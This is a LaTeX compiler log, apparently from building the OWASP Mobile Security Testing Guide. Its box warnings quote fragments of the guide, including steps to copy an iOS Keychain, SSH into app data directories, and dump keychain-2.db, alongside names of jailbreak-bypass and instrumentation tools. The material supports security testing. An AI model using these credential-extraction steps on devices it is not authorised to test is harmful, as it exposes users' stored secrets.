[]\TU/SourceSansPro(0)/m/n/10.95 Any Keychain- or filesystem-based binding, whi
ch isn’t protected by \TU/SourceCodePro(6)/m/n/10.95 SecAccessControlCreateFlag
s

Overfull \hbox (190.44939pt too wide) in paragraph at lines 47530--47534
\TU/SourceSansPro(0)/m/n/10.95 or and doesn’t use protection classes, such as \
TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAlways \TU/SourceSansPro(0)/m/n
/10.95 and \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAlwaysThisDeviceOnl
y\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (204.76152pt too wide) in paragraph at lines 47573--47575
[]\TU/SourceSansPro(0)/m/n/10.95 Copy the contents of the Keychain. Since iOS 8
, this has been in \TU/SourceCodePro(6)/m/n/10.95 ~/Library/Developer/CoreSimul
ator/Devices/<Simulator
[834]
Overfull \hbox (146.45348pt too wide) in paragraph at lines 47611--47617
\TU/SourceCodePro(6)/m/n/10.95 <name of app>\TU/SourceSansPro(0)/m/n/10.95 ). T
he directory is in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Container
s/Data/Application/<Application

Underfull \hbox (badness 4569) in paragraph at lines 47617--47623
[]\TU/SourceSansPro(0)/m/n/10.95 SSH into the directory indicated by the given 
command’s output or use SCP (\TU/SourceCodePro(6)/m/n/10.95 scp

Underfull \hbox (badness 10000) in paragraph at lines 47617--47623
\TU/SourceCodePro(6)/m/n/10.95 <ipaddress>:/<folder_found_in_previous_step> tar
getfolder\TU/SourceSansPro(0)/m/n/10.95 ) to

Overfull \hbox (60.89995pt too wide) in paragraph at lines 47623--47630
[]\TU/SourceSansPro(0)/m/n/10.95 Retrieve the data from the keychain, which is 
stored in \TU/SourceCodePro(6)/m/n/10.95 /private/var/Keychains/keychain-2.db\T
U/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 2726) in paragraph at lines 47623--47630
\TU/SourceSansPro(0)/m/n/10.95 which you can retrieve using the [][]keychain du
mper[][]. First make the keychain world-

Overfull \hbox (303.33284pt too wide) in paragraph at lines 47651--47662
\TU/SourceCodePro(6)/m/n/10.95 UIDevice.current.identifierForVendor?.uuidString
 \TU/SourceSansPro(0)/m/n/10.95 (in Swift3), or \TU/SourceCodePro(6)/m/n/10.95 
UIDevice.currentDevice().identifierForVendor?.UUIDString
[835]
Overfull \hbox (0.92685pt too wide) in paragraph at lines 47662--47670
\TU/SourceSansPro(0)/m/n/10.95 this data is not backed up, use \TU/SourceCodePr
o(6)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly

Underfull \hbox (badness 1137) in paragraph at lines 47662--47670
\TU/SourceSansPro(0)/m/n/10.95 (if you want to secure the data and properly enf
orce a passcode or Touch ID requirement),

Overfull \hbox (178.7255pt too wide) in paragraph at lines 47662--47670
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
\TU/SourceSansPro(0)/m/n/10.95 , or \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAcce
ssibleWhenUnlockedThisDeviceOnly\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (160.1616pt too wide) in paragraph at lines 47674--47685
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
 \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAcce
ssibleWhenUnlockedThisDeviceOnly\TU/SourceSansPro(0)/m/n/10.95 ),

Overfull \hbox (22.60417pt too wide) in paragraph at lines 47674--47685
\TU/SourceSansPro(0)/m/n/10.95 and the \TU/SourceCodePro(6)/m/n/10.95 SecAccess
ControlCreateFlags \TU/SourceSansPro(0)/m/n/10.95 is set either with \TU/Source
CodePro(6)/m/n/10.95 kSecAccessControlDevicePasscode

Overfull \hbox (120.33586pt too wide) in paragraph at lines 47674--47685
\TU/SourceSansPro(0)/m/n/10.95 (for passcodes), \TU/SourceCodePro(6)/m/n/10.95 
kSecAccessControlUserPresence \TU/SourceSansPro(0)/m/n/10.95 (passcode, Face ID
 or Touch ID), \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny

Underfull \hbox (badness 10000) in paragraph at lines 47692--47696
\TU/SourceSansPro(0)/m/n/10.95 - [][]$[][][][][] [] [] [] [][][][][][] [] [][][
] [] [][][][][][][][][][] [] [][][][][][] [][] [][][][][][] [][] [][][][][][][]
[] [][] [][][][][][] [] [][][][] [] [][][][][][] [] [][][][][][][][][] [][] [][
][][] [][]
[836] [837] [838]
Underfull \hbox (badness 1137) in paragraph at lines 47848--47853
[]\TU/SourceSansPro(0)/m/n/10.95 Frida: A dynamic instrumentation toolkit for d
evelopers, reverse-engineers, and security re-
[839]
Underfull \hbox (badness 3568) in paragraph at lines 47934--47938
[]\TU/SourceSansPro(0)/m/n/10.95 ClassNameDeobfuscator: Simple script to parse 
through the .smali files produced by ap-

Underfull \hbox (badness 10000) in paragraph at lines 47934--47938
\TU/SourceSansPro(0)/m/n/10.95 ktool and extract the .source annotation lines -
 [][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][
][][] []
[840]
Overfull \hbox (11.56958pt too wide) in paragraph at lines 47976--47979
[]\TU/SourceSansPro(0)/m/n/10.95 Android Tcpdump: A command line packet capture
 utility for Android - [][]$[][][][][] [] [] [] [][][] [] [][][][][][][][][][][
][][][] []
[841]
Underfull \hbox (badness 5726) in paragraph at lines 48047--48049
[]\TU/SourceSansPro(0)/m/n/10.95 itunnel: A tool used to forward SSH via USB - 
[][]$[][][][][] [] [] [] [][][][] [] [][][][][][] [] [][][] [] [] [] [][][][][]
[][][][][][][] [][]
[842]
Underfull \hbox (badness 4060) in paragraph at lines 48170--48173
[]\TU/SourceSansPro(0)/m/n/10.95 tsProtector: A tool for bypassing Jailbreak de
tection - [][]$[][][][] [] [] [] [][][][][] [] [][][][][][] [] [][][] [] [][][]
[][][][] [] [][] []

Underfull \hbox (badness 10000) in paragraph at lines 48173--48175
[]\TU/SourceSansPro(0)/m/n/10.95 Xcon: A tool for bypassing Jailbreak detection
 - [][]$[][][][] [] [] [] [][][][][] [] [][][][][][] [] [][][] [] [][][][][][][
] [] [][][] []
[843]
Underfull \hbox (badness 2521) in paragraph at lines 48214--48217
[]\TU/SourceSansPro(0)/m/n/10.95 Burp Suite: An integrated platform for perform
ing security testing of applications - [][]$[][][][][] []

Underfull \hbox (badness 2913) in paragraph at lines 48217--48221
[]\TU/SourceSansPro(0)/m/n/10.95 Charles Proxy: HTTP proxy / HTTP monitor / Rev
erse Proxy that enables a developer to

Underfull \hbox (badness 3601) in paragraph at lines 48217--48221
\TU/SourceSansPro(0)/m/n/10.95 view all of the HTTP and SSL / HTTPS traffic bet
ween their machine and the Internet -
[844]
Underfull \hbox (badness 3209) in paragraph at lines 48272--48278
[]\TU/SourceSansPro(0)/m/n/10.95 AndroGoat: An open source vulnerable/insecure 
app using Kotlin. This app has a wide

Underfull \hbox (badness 4205) in paragraph at lines 48272--48278
\TU/SourceSansPro(0)/m/n/10.95 range of vulnerabilities related to certificate 
pinning, custom URL schemes, Android Net-

Underfull \hbox (badness 3323) in paragraph at lines 48272--48278
\TU/SourceSansPro(0)/m/n/10.95 work Security Configuration, WebViews, root dete
ction and over 20 other vulnerabilities -

Underfull \hbox (badness 1062) in paragraph at lines 48278--48281
[]\TU/SourceSansPro(0)/m/n/10.95 DVHMA: A hybrid mobile app (for Android) that 
intentionally contains vulnerabilities - [][]$[][][][][] []

Underfull \hbox (badness 1112) in paragraph at lines 48298--48302
[]\TU/SourceSansPro(0)/m/n/10.95 MSTG Android app: Java - A vulnerable Android 
app with vulnerabilities similar to the test

Underfull \hbox (badness 5274) in paragraph at lines 48320--48325
[]\TU/SourceSansPro(0)/m/n/10.95 DVIA: A vulnerable iOS app written in Objectiv
e-C which provides a platform to mobile

Underfull \hbox (badness 4132) in paragraph at lines 48320--48325
\TU/SourceSansPro(0)/m/n/10.95 security enthusiasts/professionals or students t
o test their iOS penetration testing skills -
[845]
Underfull \hbox (badness 2990) in paragraph at lines 48384--48389
[]\TU/SourceSansPro(0)/m/n/10.95 Charlie Miller, Dionysus Blazakis, Dino Dai Zo
vi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp

Underfull \hbox (badness 1917) in paragraph at lines 48384--48389
\TU/SourceSansPro(0)/m/n/10.95 Weinmann (2012) \TU/SourceSansPro(0)/m/it/10.95 
iOS Hacker’s Handbook\TU/SourceSansPro(0)/m/n/10.95 . Wiley. Available at: [][]
$[][][][][] [] [] [] [][][] [] [][][][][] [] [][][] [] [][] [][]
[846]
Underfull \hbox (badness 1642) in paragraph at lines 48406--48410
[]\TU/SourceSansPro(0)/m/n/10.95 Bruce Dang, Alexandre Gazet, Elias Backaalany 
(2014) \TU/SourceSansPro(0)/m/it/10.95 Practical Reverse Engineering\TU/SourceS
ansPro(0)/m/n/10.95 . Wiley.

Underfull \hbox (badness 1226) in paragraph at lines 48406--48410
\TU/SourceSansPro(0)/m/n/10.95 Available at: [][]$[][][][][] [] [] [] [][][] []
 [][][][][] [] [][][] [] [][] [][] [][] [] [][][][][][][][][] [] [][][][][][][]
 [] [][][][][][][][][][][] [] [][] [] [][][] [] [][] [] [][][] []

Underfull \hbox (badness 2376) in paragraph at lines 48413--48417
\TU/SourceSansPro(0)/m/n/10.95 GSEC Singapore. Available at: [][]$[][][][] [] [
] [] [][][][] [] [][][][] [] [][][] [] [][][][][][][][][] [] [][][][][][] [] []
[] [] [][] [][] [][][][][][][][][][][] []
[847]
Underfull \hbox (badness 10000) in paragraph at lines 48441--48444
[][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][] [][
] [][][][] [] [][][][][] [] [] [] [][] [] [][][][] [] [][] [] [][][][][][][][] 
[] [][][][][][] [] [][][][][][] [][] [][] [][] [][] [] [][][][][] [][]
[848] [849]
Underfull \hbox (badness 2012) in paragraph at lines 48580--48586
\TU/SourceSansPro(0)/m/n/10.95 Dump(Z/etc), Clutch, Drozer, Frida, Hopper, Ghid
ra, IDB, Ipa Installer, iFunBox, iOS-deploy,
[850] [851] [852] [853] [854] (/tmp/tex2pdf.-b81d3c9506d190f0/input.aux)

LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.

 )
(see the transcript file for additional information)
Output written on /tmp/tex2pdf.-b81d3c9506d190f0/input.pdf (854 pages).
Transcript written on /tmp/tex2pdf.-b81d3c9506d190f0/input.log.

[makePDF] Run #3
This is XeTeX, Version 3.14159265-2.6-0.99996 (TeX Live 2016/Debian) (preloaded format=xelatex)
 restricted \write18 enabled.
entering extended mode
(/tmp/tex2pdf.-b81d3c9506d190f0/input.tex
LaTeX2e <2017/01/01> patch level 3
Babel <3.9r> and hyphenation patterns for 37 language(s) loaded.
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls
Document Class: scrartcl 2016/06/14 v3.21 KOMA-Script document class (article)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty
Package scrlfile, 2016/06/14 v3.21 KOMA-Script package (loading files)
                  Copyright (C) Markus Kohm

))) (/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)

Class scrartcl Warning: You've used obsolete option `tablecaptionabove'.
(scrartcl)              Usage of this option indicates an old document
(scrartcl)              and changes compatibility level using
(scrartcl)              `captions=tableheading,version=first,
(scrartcl)              enabledeprecatedfontcommands' that may result
(scrartcl)              in further warnings.
(scrartcl)              If you don't want this, you should simply
(scrartcl)              replace option `tablecaptionabove' by `captions=tablehe
ading'.


Class scrartcl Warning: deprecated option `enabledeprecatedfontcommands'.
(scrartcl)              Note, that this option was already depreacted when
(scrartcl)              it has been defined. Support for old font commands
(scrartcl)              has been removed from KOMA-Script more than one
(scrartcl)              decade ago. It is not recommended to use them any
(scrartcl)              longer. Therefore usage of this class option also
(scrartcl)              is not recommended.

(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty
Package typearea, 2016/06/14 v3.21 KOMA-Script package (type area)
                  Copyright (C) Frank Neukam, 1992-1994
                  Copyright (C) Markus Kohm, 1994-

)) (/usr/share/texmf/tex/latex/lm/lmodern.sty)
(/usr/share/texlive/texmf-dist/tex/latex/setspace/setspace.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amssymb.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
For additional information on amsmath, use the `?' option.
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
(/usr/share/texlive/texmf-dist/tex/generic/ifxetex/ifxetex.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifluatex.sty)
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math.sty
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3.sty
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3-code.tex)
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/l3xdvipdfmx.def))
(/usr/share/texlive/texmf-dist/tex/latex/ucharcat/ucharcat.sty)
(/usr/share/texlive/texmf-dist/tex/latex/l3packages/xparse/xparse.sty)
(/usr/share/texlive/texmf-dist/tex/latex/l3packages/l3keys2e/l3keys2e.sty)
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.sty
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec-xetex.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/tuenc.def))
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.cfg)))
(/usr/share/texlive/texmf-dist/tex/latex/base/fix-cm.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ts1enc.def))
(/usr/share/texlive/texmf-dist/tex/latex/filehook/filehook.sty
(/usr/share/texlive/texmf-dist/tex/latex/filehook/filehook-scrlfile.sty))
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math-xetex.sty
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math-table.tex)))
 (/usr/share/texlive/texmf-dist/tex/latex/upquote/upquote.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ts1enc.def)))
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.sty
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype-xetex.def)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/xcolor.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/color.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/xetex.def)
(/usr/share/texlive/texmf-dist/tex/latex/colortbl/colortbl.sty
(/usr/share/texlive/texmf-dist/tex/latex/tools/array.sty))
(/usr/share/texlive/texmf-dist/tex/latex/graphics/dvipsnam.def)
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/svgnam.def)
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/x11nam.def))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/bookmark.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdfescape.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ltxcmds.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdftexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/infwarerr.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifpdf.sty)))
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifvtex.sty)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hyperref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/hobsub-hyperref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/hobsub-generic.sty))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/auxhook.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/kvoptions.sty)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/pd1enc.def)
(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/hyperref.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/puenc.def)
(/usr/share/texlive/texmf-dist/tex/latex/url/url.sty))

Package hyperref Message: Driver (autodetected): hxetex.

(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hxetex.def
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/stringenc.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/rerunfilecheck.sty))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/bkm-dvipdfm.def))
(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty)
(/usr/share/texlive/texmf-dist/tex/latex/fancyvrb/fancyvrb.sty
Style option: `fancyvrb' v2.7a, with DG/SPQR fixes, and firstline=lastline fix 
<2008/02/07> (tvz))
(/usr/share/texlive/texmf-dist/tex/latex/fvextra/fvextra.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ifthen.sty)
(/usr/share/texlive/texmf-dist/tex/latex/etoolbox/etoolbox.sty)
(/usr/share/texlive/texmf-dist/tex/latex/lineno/lineno.sty))
(/usr/share/texlive/texmf-dist/tex/latex/tools/longtable.sty)
(/usr/share/texlive/texmf-dist/tex/latex/booktabs/booktabs.sty)
(/usr/share/texlive/texmf-dist/tex/latex/footnotehyper/footnotehyper.sty
(/usr/share/texlive/texmf-dist/tex/latex/mdwtools/footnote.sty))
(/usr/share/texlive/texmf-dist/tex/latex/footnotebackref/footnotebackref.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/grffile.sty)
(/usr/share/texlive/texmf-dist/tex/latex/float/float.sty)
(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty

LaTeX Warning: Command \underbar  has changed.
               Check if current package is valid.

) (/usr/share/texlive/texmf-dist/tex/latex/incgraph/incgraph.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgfkeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeysfiltered.code.t
ex))) (/usr/share/texlive/texmf-dist/tex/latex/pgf/basiclayer/pgf.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgfrcs.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-common.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-common-lists.t
ex)) (/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-latex.def
(/usr/share/texlive/texmf-dist/tex/latex/ms/everyshi.sty))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfrcs.code.tex))
(/usr/share/texlive/texmf-dist/tex/latex/pgf/basiclayer/pgfcore.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/systemlayer/pgfsys.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgf.cfg)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-xetex.def
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-dvipdfmx.def
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-common-pdf.de
f))))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsyssoftpath.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsysprotocol.code.
tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcore.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathcalc.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathutil.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathparser.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.basic.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.trigonomet
ric.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.random.cod
e.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.comparison
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.base.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.round.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.misc.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.integerari
thmetics.code.tex)))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfloat.code.tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepoints.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathconstruct.
code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathusage.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorescopes.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoregraphicstate.c
ode.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransformation
s.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorequick.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreobjects.code.t
ex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathprocessing
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorearrows.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreshade.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreimage.code.tex

(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreexternal.code.
tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorelayers.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransparency.c
ode.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepatterns.code.
tex)))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmoduleshapes.code.tex
) (/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmoduleplot.code.tex
)
(/usr/share/texlive/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version-0-65
.sty)
(/usr/share/texlive/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version-1-18
.sty)) (/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgffor.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/math/pgfmath.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgffor.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))))
(/usr/share/texlive/texmf-dist/tex/latex/pgf/frontendlayer/tikz.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/frontendlayer/tikz/tikz.code.tex

(/usr/share/texlive/texmf-dist/tex/generic/pgf/libraries/pgflibraryplothandlers
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmodulematrix.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/frontendlayer/tikz/libraries/tik
zlibrarytopaths.code.tex)))
(/usr/share/texlive/texmf-dist/tex/latex/polyglossia/polyglossia.sty
(/usr/share/texlive/texmf-dist/tex/latex/makecmds/makecmds.sty)
(/usr/share/texlive/texmf-dist/tex/latex/xkeyval/xkeyval.sty
(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkeyval.tex
(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkvutils.tex))))
(/usr/share/texlive/texmf-dist/tex/latex/polyglossia/gloss-english.ldf)
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.sty
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.def)
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/caption/caption.sty
(/usr/share/texlive/texmf-dist/tex/latex/caption/caption3.sty)
(/usr/share/texlive/texmf-dist/tex/latex/caption/ltcaption.sty))
(/usr/share/texlive/texmf-dist/tex/latex/mdframed/mdframed.sty
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/zref-abspage.sty
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/zref-base.sty))
(/usr/share/texlive/texmf-dist/tex/latex/needspace/needspace.sty)
(/usr/share/texlive/texmf-dist/tex/latex/mdframed/md-frame-0.mdf))
(/texmf/tex/latex/sourcesanspro/sourcesanspro.sty)
(/texmf/tex/latex/sourcecodepro/sourcecodepro.sty)
(/usr/share/texlive/texmf-dist/tex/latex/titling/titling.sty)

Class scrartcl Warning: Usage of package `fancyhdr' together
(scrartcl)              with a KOMA-Script class is not recommended.
(scrartcl)              I'd suggest to use 
(scrartcl)              package `scrlayer-scrpage'.
(scrartcl)              Nevertheless, using requested
(scrartcl)              package `fancyhdr' on input line 362.

(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)
(/tmp/tex2pdf.-b81d3c9506d190f0/input.aux)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/nameref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/gettitlestring.sty))
*geometry* driver: auto-detecting
*geometry* detected driver: xetex
ABD: EveryShipout initializing macros

Package caption Warning: \caption will not be redefined since it's already
(caption)                redefined by a document class or package which is
(caption)                unknown to the caption package.
See the caption package documentation for explanation.

<use  "cover.jpg" > [1]

Class scrartcl Warning: incompatible usage of \@ssect detected.
(scrartcl)              You've used the KOMA-Script implementation of \@ssect
(scrartcl)              from within a non compatible caller, that does not
(scrartcl)              \scr@s@ct@@nn@m@ locally.
(scrartcl)              This could result in several error messages on input li
ne 415.

[2] (/tmp/tex2pdf.-b81d3c9506d190f0/input.toc
(/usr/share/texmf/tex/latex/lm/omllmm.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-msa.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-msb.cfg) [3]
Underfull \hbox (badness 3690) in paragraph at lines 112--112
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Testing Two-Factor Authentication and St
ep-up Authentication (MSTG-AUTH-9 and 

Underfull \hbox (badness 2150) in paragraph at lines 154--154
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Making Sure that Critical Operations Use
 Secure Communication Channels (MSTG- 
[4]
Underfull \hbox (badness 1509) in paragraph at lines 404--404
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Determining Whether the Keyboard Cache I
s Disabled for Text Input Fields (MSTG- 

Underfull \hbox (badness 1221) in paragraph at lines 408--408
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Determining Whether Sensitive Stored Dat
a Has Been Exposed via IPC Mechanisms 
[5]
Overfull \hbox (0.10948pt too wide) detected at line 446
 []\TU/SourceSansPro(0)/m/n/10.95 360

Overfull \hbox (0.10948pt too wide) detected at line 447
 []\TU/SourceSansPro(0)/m/n/10.95 360

Overfull \hbox (0.28468pt too wide) detected at line 526
 []\TU/SourceSansPro(0)/m/n/10.95 404

Overfull \hbox (0.28468pt too wide) detected at line 527
 []\TU/SourceSansPro(0)/m/n/10.95 404

Overfull \hbox (0.14233pt too wide) detected at line 607
 []\TU/SourceSansPro(0)/m/n/10.95 448

Overfull \hbox (0.35037pt too wide) detected at line 638
 []\TU/SourceSansPro(0)/m/n/10.95 460
[6]
Overfull \hbox (0.20802pt too wide) detected at line 649
 []\TU/SourceSansPro(0)/m/n/10.95 466

Overfull \hbox (1.31398pt too wide) detected at line 714
